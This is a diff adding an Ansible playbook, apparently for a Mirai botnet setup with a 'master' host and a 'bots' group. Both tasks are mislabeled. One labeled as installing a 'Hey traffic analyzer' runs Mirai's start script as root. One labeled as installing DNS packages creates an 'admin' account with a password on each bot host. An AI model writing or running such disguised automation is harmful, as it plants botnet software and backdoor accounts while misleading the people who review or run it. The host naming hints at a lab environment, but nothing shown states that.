@@ -1,0 +1,17 @@
+---
+                  
+- hosts: master
+  become: true
+  tasks:
+    - name: Installing Hey traffic analyzer
+      shell: |
+        cd mirai && bash start.sh
+
+- hosts: bots
+  become: true
+  tasks:
+    - name: Installing dns required packages
+      shell: |
+         adduser admin
+         passwd admin
+
